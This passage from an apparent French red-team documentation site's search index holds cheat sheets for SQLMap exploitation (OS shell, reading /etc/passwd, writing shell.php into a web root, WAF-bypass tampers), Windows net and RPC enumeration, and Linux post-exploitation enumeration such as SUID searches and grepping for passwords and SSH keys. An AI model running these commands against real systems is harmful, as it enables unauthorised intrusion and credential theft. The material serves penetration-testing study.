--dump\n</code></pre>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#dumper-des-colonnes-specifiques-dune-table","title":"Dumper des colonnes sp\u00e9cifiques d'une table","text":"<pre><code>sqlmap -r request.txt -D &lt;nom_db&gt; -T &lt;nom_table&gt; -C &lt;col1,col2&gt; --dump\n</code></pre>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#dumper-toutes-les-tables-de-toutes-les-bases-de-donnees","title":"Dumper toutes les tables de toutes les bases de donn\u00e9es","text":"<pre><code>sqlmap -r request.txt --dump-all\n</code></pre> <ul> <li>Usage : Tr\u00e8s long et bruyant, \u00e0 utiliser avec parcimonie.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#exploitation-acces-systeme","title":"\ud83d\udca5 Exploitation (Acc\u00e8s Syst\u00e8me)","text":"<p>[!Attention] Ces actions sont tr\u00e8s intrusives et n\u00e9cessitent g\u00e9n\u00e9ralement que l'utilisateur de la base de donn\u00e9es ait des privil\u00e8ges tr\u00e8s \u00e9lev\u00e9s (DBA) et que le SGBD soit configur\u00e9 de mani\u00e8re permissive.</p>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#obtenir-un-shell-interactif-sur-le-systeme-dexploitation-via-la-base-de-donnees","title":"Obtenir un shell interactif sur le syst\u00e8me d'exploitation via la base de donn\u00e9es","text":"<pre><code>sqlmap -r request.txt --os-shell\n</code></pre> <ul> <li>Contexte : Tente d'uploader un petit shell (via diff\u00e9rentes techniques selon le SGBD : <code>xp_cmdshell</code> sur MSSQL, UDF sur MySQL/PostgreSQL, etc.) et d'obtenir une invite de commande interactive sur le serveur h\u00e9bergeant la base de donn\u00e9es.</li> <li>Pr\u00e9requis : Privil\u00e8ges DBA, SGBD et OS compatibles.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#executer-une-commande-os-unique","title":"Ex\u00e9cuter une commande OS unique","text":"<pre><code>sqlmap -r request.txt --os-cmd=\"&lt;commande&gt;\"\n# Exemple: sqlmap -r req.txt --os-cmd=\"whoami\"\n</code></pre>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#obtenir-un-shell-sql-interactif","title":"Obtenir un shell SQL interactif","text":"<pre><code>sqlmap -r request.txt --sql-shell\n</code></pre> <ul> <li>Contexte : Permet d'ex\u00e9cuter des requ\u00eates SQL arbitraires directement sur la base de donn\u00e9es.</li> <li>Usage : Utile pour une exploration manuelle ou des op\u00e9rations non pr\u00e9vues par les options de dump standard.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#lire-un-fichier-sur-le-serveur","title":"Lire un fichier sur le serveur","text":"<pre><code>sqlmap -r request.txt --file-read \"&lt;chemin_fichier_distant&gt;\"\n# Exemple: sqlmap -r req.txt --file-read \"/etc/passwd\"\n</code></pre> <ul> <li>Pr\u00e9requis : Privil\u00e8ges de lecture de fichiers pour l'utilisateur de la base de donn\u00e9es (ex: <code>FILE</code> sur MySQL, <code>pg_read_server_files</code> sur PostgreSQL).</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#ecrire-un-fichier-local-sur-le-serveur","title":"\u00c9crire un fichier local sur le serveur","text":"<pre><code>sqlmap -r request.txt --file-write \"&lt;fichier_local&gt;\" --file-dest \"&lt;chemin_destination_distant&gt;\"\n# Exemple: sqlmap -r req.txt --file-write \"shell.php\" --file-dest \"/var/www/html/uploads/shell.php\"\n</code></pre> <ul> <li>Pr\u00e9requis : Privil\u00e8ges d'\u00e9criture de fichiers pour l'utilisateur de la base de donn\u00e9es.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#techniques-et-tuning","title":"\ud83d\udee0\ufe0f Techniques et Tuning","text":""},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#forcer-une-technique-dinjection-specifique","title":"Forcer une technique d'injection sp\u00e9cifique","text":"<pre><code>sqlmap -r request.txt --technique=&lt;lettre&gt;\n# B: Boolean-based blind\n# E: Error-based\n# U: Union query-based\n# S: Stacked queries\n# T: Time-based blind\n# Q: Inline queries (rare)\n# Exemple: sqlmap -r req.txt --technique=U # Force UNION\n</code></pre> <ul> <li>Usage : Utile si on sait quel type d'injection fonctionne ou pour acc\u00e9l\u00e9rer le scan en \u00e9vitant des techniques inutiles.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#specifier-le-sgbd-cible","title":"Sp\u00e9cifier le SGBD cible","text":"<pre><code>sqlmap -r request.txt --dbms=&lt;sgbd&gt;\n# Exemples: --dbms=mysql, --dbms=mssql, --dbms=postgresql, --dbms=oracle\n</code></pre> <ul> <li>Usage : Acc\u00e9l\u00e8re le scan en ne testant que les payloads sp\u00e9cifiques au SGBD indiqu\u00e9.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#augmenter-le-nombre-de-threads-parallelisation","title":"Augmenter le nombre de threads (parall\u00e9lisation)","text":"<pre><code>sqlmap -r request.txt --threads=10\n</code></pre> <ul> <li>Usage : Acc\u00e9l\u00e8re le scan, mais augmente la charge sur le serveur cible et le risque de d\u00e9tection.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#mode-non-interactif-repond-oui-par-defaut","title":"Mode non interactif (r\u00e9pond 'oui' par d\u00e9faut)","text":"<pre><code>sqlmap -r request.txt --batch\n</code></pre> <ul> <li>Usage : Utile pour les scans automatis\u00e9s ou longs o\u00f9 l'on ne souhaite pas r\u00e9pondre manuellement aux questions de SQLMap.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#utiliser-un-user-agent-aleatoire","title":"Utiliser un User-Agent al\u00e9atoire","text":"<pre><code>sqlmap -r request.txt --random-agent\n</code></pre> <ul> <li>Usage : Tente de masquer l'empreinte de SQLMap en utilisant des User-Agents vari\u00e9s.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#contournement-de-waf-web-application-firewall","title":"\ud83d\udee1\ufe0f Contournement de WAF (Web Application Firewall)","text":""},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#utiliser-des-scripts-de-manipulation-tampers","title":"Utiliser des scripts de manipulation (tampers)","text":"<pre><code>sqlmap -r request.txt --tamper=&lt;script1,script2,...&gt;\n</code></pre> <ul> <li>Contexte : Les tampers modifient les payloads SQL envoy\u00e9s par SQLMap pour tenter de contourner les r\u00e8gles de d\u00e9tection des WAFs.</li> <li>Usage : Essentiel lorsque l'application est prot\u00e9g\u00e9e par un WAF. Il faut souvent tester plusieurs combinaisons.</li> <li>Exemples de tampers courants :<ul> <li><code>space2comment</code> : Remplace les espaces par <code>/**/</code>.</li> <li><code>base64encode</code> : Encode le payload en Base64.</li> <li><code>chardoubleencode</code> : Double encodage URL des caract\u00e8res.</li> <li><code>between</code> : Remplace <code>&gt;</code> par <code>NOT BETWEEN 0 AND</code>.</li> <li><code>randomcase</code> : Change la casse des mots-cl\u00e9s SQL (ex: <code>SELECT</code> -&gt; <code>SeLeCt</code>).</li> </ul> </li> <li>Lister les tampers disponibles : <code>sqlmap --list-tampers</code></li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#ajouter-un-prefixesuffixe-aux-payloads","title":"Ajouter un pr\u00e9fixe/suffixe aux payloads","text":"<pre><code>sqlmap -r request.txt --prefix=\"')\" --suffix=\"-- -\"\n</code></pre> <ul> <li>Contexte : Ajoute des caract\u00e8res avant (<code>prefix</code>) ou apr\u00e8s (<code>suffix</code>) le payload inject\u00e9.</li> <li>Usage : Utile pour fermer correctement des guillemets ou des parenth\u00e8ses dans la requ\u00eate SQL originale, ou pour commenter la fin de la requ\u00eate.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/SQLMap/#reinitialiser-la-session-sqlmap-vider-le-cache","title":"R\u00e9initialiser la session SQLMap (vider le cache)","text":"<pre><code>sqlmap -r request.txt --flush-session\n</code></pre> <ul> <li>Contexte : SQLMap sauvegarde les r\u00e9sultats et les informations de session pour \u00e9viter de refaire les m\u00eames tests.</li> <li>Usage : Forcer SQLMap \u00e0 recommencer les tests depuis le d\u00e9but pour une cible donn\u00e9e, utile si la configuration a chang\u00e9 ou si on veut essayer des options diff\u00e9rentes.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Windows/Net/","title":"Net","text":""},{"location":"Red%20Team/Cheatsheets/Windows/Net/#gestion-des-utilisateurs-et-des-groupes","title":"\ud83d\udc65 Gestion des utilisateurs et des groupes","text":""},{"location":"Red%20Team/Cheatsheets/Windows/Net/#ajouter-un-utilisateur","title":"\u2795 Ajouter un utilisateur","text":"<pre><code>net user [nom_utilisateur] [mot_de_passe] /add\n</code></pre> <p>Cr\u00e9e un nouvel utilisateur avec le mot de passe sp\u00e9cifi\u00e9.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/Net/#supprimer-un-utilisateur","title":"\u274c Supprimer un utilisateur","text":"<pre><code>net user [nom_utilisateur] /delete\n</code></pre> <p>Supprime un utilisateur du syst\u00e8me.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/Net/#lister-tous-les-utilisateurs","title":"\ud83d\udcdc Lister tous les utilisateurs","text":"<pre><code>net user\n</code></pre> <p>Affiche la liste des comptes utilisateurs locaux.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/Net/#changer-le-mot-de-passe-dun-utilisateur","title":"\ud83d\udd11 Changer le mot de passe d\u2019un utilisateur","text":"<pre><code>net user [nom_utilisateur] *\n</code></pre> <p>Permet de modifier le mot de passe d\u2019un utilisateur (saisir un nouveau mot de passe interactivement).</p>"},{"location":"Red%20Team/Cheatsheets/Windows/Net/#ajouter-un-utilisateur-a-un-groupe","title":"\ud83d\udc65 Ajouter un utilisateur \u00e0 un groupe","text":"<pre><code>net localgroup [nom_groupe] [nom_utilisateur] /add\n</code></pre> <p>Ajoute un utilisateur \u00e0 un groupe local.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/Net/#lister-les-membres-dun-groupe","title":"\ud83d\udc64 Lister les membres d\u2019un groupe","text":"<pre><code>net localgroup [nom_groupe]\n</code></pre> <p>Affiche tous les utilisateurs appartenant \u00e0 un groupe donn\u00e9.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/Net/#gestion-des-partages-de-fichiers-et-dossiers","title":"\ud83d\udcc2 Gestion des partages de fichiers et dossiers","text":""},{"location":"Red%20Team/Cheatsheets/Windows/Net/#lister-les-ressources-partagees","title":"\ud83d\udcdc Lister les ressources partag\u00e9es","text":"<pre><code>net share\n</code></pre> <p>Affiche tous les dossiers partag\u00e9s sur la machine.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/Net/#creer-un-partage-reseau","title":"\ud83d\udcc2 Cr\u00e9er un partage r\u00e9seau","text":"<pre><code>net share [nom_partage]=[chemin_dossier]\n</code></pre> <p>Partage un dossier sur le r\u00e9seau sous le nom sp\u00e9cifi\u00e9.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/Net/#supprimer-un-partage","title":"\u274c Supprimer un partage","text":"<pre><code>net share [nom_partage] /delete\n</code></pre> <p>Supprime un dossier partag\u00e9 du r\u00e9seau.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/Net/#gestion-des-services","title":"\u2699\ufe0f Gestion des services","text":""},{"location":"Red%20Team/Cheatsheets/Windows/Net/#lister-tous-les-services-en-cours-dexecution","title":"\ud83d\udcdd Lister tous les services en cours d\u2019ex\u00e9cution","text":"<pre><code>net start\n</code></pre> <p>Affiche tous les services actuellement actifs.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/Net/#demarrer-un-service","title":"\u25b6\ufe0f D\u00e9marrer un service","text":"<pre><code>net start [nom_service]\n</code></pre> <p>D\u00e9marre un service Windows sp\u00e9cifique.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/Net/#arreter-un-service","title":"\u23f9\ufe0f Arr\u00eater un service","text":"<pre><code>net stop [nom_service]\n</code></pre> <p>Arr\u00eate un service en cours d\u2019ex\u00e9cution.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/Net/#gestion-du-reseau","title":"\ud83c\udf10 Gestion du r\u00e9seau","text":""},{"location":"Red%20Team/Cheatsheets/Windows/Net/#voir-la-configuration-reseau","title":"\ud83d\udcca Voir la configuration r\u00e9seau","text":"<pre><code>net config [serveur|workstation]\n</code></pre> <p>Affiche la configuration r\u00e9seau du serveur ou de la station de travail.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/Net/#voir-les-statistiques-reseau","title":"\ud83d\udcc9 Voir les statistiques r\u00e9seau","text":"<pre><code>net statistics [serveur|workstation]\n</code></pre> <p>Affiche des statistiques r\u00e9seau, comme le nombre de connexions et d\u2019erreurs.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/Net/#autres-commandes-utiles","title":"\ud83d\udd0d Autres commandes utiles","text":""},{"location":"Red%20Team/Cheatsheets/Windows/Net/#voir-les-sessions-actives-sur-la-machine","title":"\ud83d\udce1 Voir les sessions actives sur la machine","text":"<pre><code>net session\n</code></pre> <p>Affiche les utilisateurs connect\u00e9s \u00e0 distance sur la machine.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/Net/#voir-les-connexions-reseau-actives","title":"\ud83d\udd17 Voir les connexions r\u00e9seau actives","text":"<pre><code>net use\n</code></pre> <p>Affiche la liste des lecteurs r\u00e9seaux connect\u00e9s.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/Net/#connecter-un-lecteur-reseau","title":"\ud83d\udd0c Connecter un lecteur r\u00e9seau","text":"<pre><code>net use [lettre_lecteur:] \\\\[nom_serveur]\\[partage] [mot_de_passe] /user:[nom_utilisateur]\n</code></pre> <p>Monte un lecteur r\u00e9seau en utilisant des identifiants sp\u00e9cifiques.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/Net/#deconnecter-un-lecteur-reseau","title":"\ud83d\udd0c D\u00e9connecter un lecteur r\u00e9seau","text":"<pre><code>net use [lettre_lecteur:] /delete\n</code></pre> <p>D\u00e9monte un lecteur r\u00e9seau connect\u00e9.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/Net/#envoyer-un-message-a-un-utilisateur-ou-une-machine","title":"\ud83d\udce9 Envoyer un message \u00e0 un utilisateur ou une machine","text":"<pre><code>net send [nom_machine] [message]\n</code></pre> <p>Envoie un message r\u00e9seau \u00e0 un utilisateur ou une machine sur le r\u00e9seau.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/RPC/","title":"RPC","text":""},{"location":"Red%20Team/Cheatsheets/Windows/RPC/#connexion-via-rpc","title":"\ud83d\udd11 Connexion via RPC","text":"<pre><code>rpc -U $users $ip\n</code></pre> <p>Ouvre une session RPC avec un utilisateur sp\u00e9cifique.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/RPC/#informations-sur-le-serveur-et-le-domaine","title":"\ud83d\udda5 Informations sur le serveur et le domaine","text":""},{"location":"Red%20Team/Cheatsheets/Windows/RPC/#obtenir-des-informations-sur-le-serveur","title":"Obtenir des informations sur le serveur","text":"<pre><code>srvinfo\n</code></pre> <p>Affiche des d\u00e9tails sur le syst\u00e8me d\u2019exploitation, la version Windows, et le r\u00f4le du serveur.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/RPC/#lister-les-domaines-disponibles","title":"Lister les domaines disponibles","text":"<pre><code>enumdomains\n</code></pre> <p>Affiche tous les domaines auxquels le serveur appartient.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/RPC/#obtenir-des-informations-sur-un-domaine","title":"Obtenir des informations sur un domaine","text":"<pre><code>querydominfo\n</code></pre> <p>Retourne des d\u00e9tails sur le domaine, comme le contr\u00f4leur de domaine principal et le nombre d\u2019utilisateurs.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/RPC/#gestion-des-utilisateurs-et-groupes","title":"\ud83d\udc65 Gestion des utilisateurs et groupes","text":""},{"location":"Red%20Team/Cheatsheets/Windows/RPC/#lister-les-utilisateurs-du-domaine","title":"Lister les utilisateurs du domaine","text":"<pre><code>enumdomusers\n</code></pre> <p>Affiche tous les utilisateurs enregistr\u00e9s dans le domaine.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/RPC/#obtenir-des-informations-sur-un-utilisateur","title":"Obtenir des informations sur un utilisateur","text":"<pre><code>queryuser &lt;0xrid&gt;\n</code></pre> <p>Retourne les d\u00e9tails d\u2019un utilisateur, comme la date de derni\u00e8re connexion et l\u2019\u00e9tat du compte.</p> <p>[!Astuce]</p> <pre><code>queryuser 0x3E8\n</code></pre> <p>Affiche les informations de l\u2019utilisateur ayant le RID <code>0x3E8</code>.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/RPC/#lister-les-groupes-dun-utilisateur","title":"Lister les groupes d\u2019un utilisateur","text":"<pre><code>queryusergroups &lt;0xrid&gt;\n</code></pre> <p>Affiche les groupes auxquels un utilisateur appartient.</p> <p>[!Astuce]</p> <pre><code>queryusergroups 0x3E8\n</code></pre> <p>Liste les groupes associ\u00e9s \u00e0 l\u2019utilisateur ayant le RID <code>0x3E8</code>.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/RPC/#lister-tous-les-groupes-du-domaine","title":"Lister tous les groupes du domaine","text":"<pre><code>enumdomgroups\n</code></pre> <p>Affiche la liste compl\u00e8te des groupes Active Directory.</p>"},{"location":"Red%20Team/Cheatsheets/Windows/RPC/#gestion-des-partages-reseau","title":"\ud83d\udcc2 Gestion des partages r\u00e9seau","text":""},{"location":"Red%20Team/Cheatsheets/Windows/RPC/#lister-tous-les-partages-accessibles","title":"Lister tous les partages accessibles","text":"<pre><code>netshareenumall\n</code></pre> <p>Affiche tous les partages SMB disponibles, y compris les partages cach\u00e9s (<code>C$</code>, <code>ADMIN$</code>).</p>"},{"location":"Red%20Team/Cheatsheets/Windows/RPC/#obtenir-des-details-sur-un-partage","title":"Obtenir des d\u00e9tails sur un partage","text":"<pre><code>netsharegetinfo &lt;share&gt;\n</code></pre> <p>Affiche des informations sur un partage r\u00e9seau sp\u00e9cifique.</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/","title":"Enum\u00e9ration","text":"<p>Objectif : L'\u00e9num\u00e9ration sur un syst\u00e8me Linux apr\u00e8s un acc\u00e8s initial est cruciale pour comprendre l'environnement, identifier les mauvaises configurations, trouver des informations sensibles et d\u00e9couvrir des vecteurs potentiels d'escalade de privil\u00e8ges (PrivEsc).</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#i-informations-systeme-et-os","title":"\u2139\ufe0f Informations Syst\u00e8me et OS","text":"<ul> <li>Objectif : Comprendre la nature du syst\u00e8me (distribution, version, architecture, kernel). Utile pour rechercher des exploits sp\u00e9cifiques au kernel ou \u00e0 la distribution.</li> </ul> <pre><code># Nom d'h\u00f4te\nhostname\n\n# Informations sur la distribution\ncat /etc/issue\ncat /etc/*-release\nlsb_release -a\n\n# Informations sur le Kernel\nuname -a\nuname -r # Version du kernel seule\ncat /proc/version\n\n# Informations CPU\nlscpu\n\n# Informations sur les p\u00e9riph\u00e9riques bloc (disques, partitions)\nlsblk\n\n# Syst\u00e8mes de fichiers mont\u00e9s et espace disque\ndf -h\nmount\ncat /etc/fstab # Configuration statique des points de montage\n````\n\n### \ud83d\udc64 **Informations Utilisateur et Groupe**\n\n- **Objectif :** Identifier l'utilisateur actuel, ses privil\u00e8ges, les autres utilisateurs pr\u00e9sents, et les groupes existants.\n</code></pre>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#qui-suis-je-utilisateur-actuel","title":"Qui suis-je ? (utilisateur actuel)","text":"<p>whoami id</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#utilisateurs-actuellement-connectes","title":"Utilisateurs actuellement connect\u00e9s","text":"<p>w who</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#dernieres-connexions-utilisateur","title":"Derni\u00e8res connexions utilisateur","text":"<p>last</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#groupes-de-lutilisateur-actuel","title":"Groupes de l'utilisateur actuel","text":"<p>groups</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#lister-tous-les-utilisateurs-locaux","title":"Lister tous les utilisateurs locaux","text":"<p>cat /etc/passwd | cut -d: -f1 ls /home</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#lister-tous-les-groupes-locaux","title":"Lister tous les groupes locaux","text":"<p>cat /etc/group | cut -d: -f1</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#historique-des-commandes-peut-contenir-des-mots-de-passe","title":"Historique des commandes (peut contenir des mots de passe !)","text":"<p>history cat ~/.bash_history cat ~/.zsh_history cat ~/.ash_history # etc. <pre><code>### \ud83c\udf10 **Informations R\u00e9seau**\n\n- **Objectif :** Comprendre la configuration r\u00e9seau de la machine, les services en \u00e9coute, et les connexions \u00e9tablies.\n</code></pre></p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#configuration-des-interfaces-reseau-ip-mac","title":"Configuration des interfaces r\u00e9seau (IP, MAC)","text":"<p>ip a ifconfig # Ancien, peut ne pas \u00eatre install\u00e9</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#table-de-routage","title":"Table de routage","text":"<p>ip r route -n # Ancien</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#connexions-reseau-actives-tcp-udp-services-en-ecoute","title":"Connexions r\u00e9seau actives (TCP, UDP), services en \u00e9coute","text":""},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#ss-est-plus-moderne-que-netstat","title":"ss est plus moderne que netstat","text":"<p>ss -tulpn netstat -tulpn # Peut n\u00e9cessiter l'installation de net-tools</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#informations-dns","title":"Informations DNS","text":"<p>cat /etc/resolv.conf</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#fichier-hosts-peut-reveler-dautres-machines-sur-le-reseau","title":"Fichier hosts (peut r\u00e9v\u00e9ler d'autres machines sur le r\u00e9seau)","text":"<p>cat /etc/hosts <pre><code>### \u2699\ufe0f **Processus et Services en Cours**\n\n- **Objectif :** Identifier les processus actifs, les services qui tournent, et les utilisateurs qui les ex\u00e9cutent. Peut r\u00e9v\u00e9ler des services personnalis\u00e9s ou mal configur\u00e9s.\n</code></pre></p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#lister-tous-les-processus-differents-formats","title":"Lister tous les processus (diff\u00e9rents formats)","text":"<p>ps aux ps auxf # Avec arborescence ps -ef</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#visualiser-les-processus-en-temps-reel-utilisation-cpumemoire","title":"Visualiser les processus en temps r\u00e9el (utilisation CPU/M\u00e9moire)","text":"<p>top htop # Plus interactif, peut n\u00e9cessiter une installation</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#lister-les-services-systemd","title":"Lister les services (Systemd)","text":"<p>systemctl list-units --type=service --state=running</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#lister-les-services-ancien-initd","title":"Lister les services (Ancien init.d)","text":"<p>service --status-all # Fonctionne sur certains syst\u00e8mes ls -l /etc/init.d/ <pre><code>### \u23f0 **T\u00e2ches Planifi\u00e9es (Cron Jobs &amp; Timers)**\n\n- **Objectif :** Trouver des scripts ou commandes ex\u00e9cut\u00e9s automatiquement \u00e0 intervalles r\u00e9guliers, potentiellement avec des privil\u00e8ges \u00e9lev\u00e9s ou via des scripts modifiables.\n</code></pre></p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#taches-cron-de-lutilisateur-actuel","title":"T\u00e2ches cron de l'utilisateur actuel","text":"<p>crontab -l</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#taches-cron-systeme","title":"T\u00e2ches cron syst\u00e8me","text":"<p>cat /etc/crontab ls -l /etc/cron.* # V\u00e9rifier les dossiers cron.d, cron.hourly, etc.</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#taches-cron-des-autres-utilisateurs-necessite-des-privileges","title":"T\u00e2ches cron des autres utilisateurs (n\u00e9cessite des privil\u00e8ges)","text":"<p>cat /var/spool/cron/crontabs/*</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#timers-systemd-alternative-moderne-a-cron","title":"Timers Systemd (alternative moderne \u00e0 cron)","text":"<p>systemctl list-timers --all <pre><code>### \ud83d\udd11 **Permissions et Vecteurs de PrivEsc Potentiels**\n\n- **Objectif :** Identifier les failles de configuration classiques permettant une \u00e9l\u00e9vation de privil\u00e8ges.\n</code></pre></p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#verifier-les-droits-sudo-de-lutilisateur-actuel","title":"V\u00e9rifier les droits sudo de l'utilisateur actuel","text":"<p>sudo -l</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#rechercher-les-binaires-avec-le-bit-suid-sexecutent-en-tant-que-proprietaire-souvent-root","title":"Rechercher les binaires avec le bit SUID (s'ex\u00e9cutent en tant que propri\u00e9taire, souvent root)","text":""},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#attention-peut-etre-long-et-generer-beaucoup-de-logscharge","title":"Attention: peut \u00eatre long et g\u00e9n\u00e9rer beaucoup de logs/charge","text":"<p>find / -type f -perm -4000 -ls 2&gt;/dev/null</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#rechercher-les-binaires-avec-le-bit-sgid-sexecutent-avec-les-droits-du-groupe-proprietaire","title":"Rechercher les binaires avec le bit SGID (s'ex\u00e9cutent avec les droits du groupe propri\u00e9taire)","text":"<p>find / -type f -perm -2000 -ls 2&gt;/dev/null</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#rechercher-les-capabilities-mecanisme-de-privileges-fins-sous-linux","title":"Rechercher les \"capabilities\" (m\u00e9canisme de privil\u00e8ges fins sous Linux)","text":"<p>getcap -r / 2&gt;/dev/null</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#rechercher-les-dossiersfichiers-modifiables-par-lutilisateur-actuel-world-writable-ou-appartenant-a-lutilisateurgroupe","title":"Rechercher les dossiers/fichiers modifiables par l'utilisateur actuel (World-writable ou appartenant \u00e0 l'utilisateur/groupe)","text":""},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#attention-peut-etre-tres-long","title":"Attention: peut \u00eatre tr\u00e8s long","text":"<p>find / -writable -type d 2&gt;/dev/null # Dossiers modifiables find / -perm -o+w -type d 2&gt;/dev/null # Dossiers world-writable find / -perm -o+w -type f 2&gt;/dev/null # Fichiers world-writable</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#verifier-si-des-chemins-dans-path-sont-modifiables","title":"V\u00e9rifier si des chemins dans $PATH sont modifiables","text":"<p>echo $PATH | tr ':' '\\n' | while read path; do ls -ld $path; done</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#lister-les-paquets-installes-pour-rechercher-des-versions-vulnerables","title":"Lister les paquets install\u00e9s (pour rechercher des versions vuln\u00e9rables)","text":"<p>dpkg -l # Debian/Ubuntu rpm -qa # CentOS/Fedora/RHEL <pre><code>&gt; [!Astuce]\n&gt; \n&gt; Croisez les r\u00e9sultats des SUID/SGID/Capabilities avec GTFOBins pour voir s'ils peuvent \u00eatre abus\u00e9s pour obtenir un shell ou \u00e9lever les privil\u00e8ges.\n\n### \ud83d\udcc2 **Recherche de Fichiers et Donn\u00e9es Sensibles**\n\n- **Objectif :** Trouver des fichiers de configuration, des scripts, des cl\u00e9s, des mots de passe cod\u00e9s en dur, ou d'autres informations utiles.\n</code></pre></p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#rechercher-des-fichiers-de-configuration-courants","title":"Rechercher des fichiers de configuration courants","text":"<p>find /etc -name \".conf\" 2&gt;/dev/null find / -name \"config*\" -type f 2&gt;/dev/null</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#rechercher-des-fichiers-modifies-recemment-ex-les-10-derniers-jours","title":"Rechercher des fichiers modifi\u00e9s r\u00e9cemment (ex: les 10 derniers jours)","text":"<p>find / -mtime -10 2&gt;/dev/null</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#rechercher-des-mots-cles-sensibles-password-secret-key-api_key-etc-dans-des-fichiers","title":"Rechercher des mots-cl\u00e9s sensibles (password, secret, key, api_key, etc.) dans des fichiers","text":""},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#attention-commandes-potentiellement-tres-longues-et-gourmandes","title":"Attention: commandes potentiellement tr\u00e8s longues et gourmandes","text":"<p>grep -RiE '(password|secret|key)' /etc 2&gt;/dev/null grep -RiE '(password|secret|key)' /var/www 2&gt;/dev/null # Si un serveur web est pr\u00e9sent grep -RiE '(password|secret|key)' /home 2&gt;/dev/null</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#rechercher-des-cles-ssh-privees","title":"Rechercher des cl\u00e9s SSH priv\u00e9es","text":"<p>find / -name \"id_rsa\" 2&gt;/dev/null ls -la ~/.ssh/</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#rechercher-des-scripts-sh-py-pl-etc","title":"Rechercher des scripts (.sh, .py, .pl, etc.)","text":"<p>find / -name \".sh\" 2&gt;/dev/null find / -name \".py\" 2&gt;/dev/null</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#verifier-les-logs-peuvent-contenir-des-erreurs-revelatrices-ou-des-infos-sensibles","title":"V\u00e9rifier les logs (peuvent contenir des erreurs r\u00e9v\u00e9latrices ou des infos sensibles)","text":"<p>ls -l /var/log/ ```</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#scripts-denumeration-automatisee","title":"\ud83e\udd16 Scripts d'\u00c9num\u00e9ration 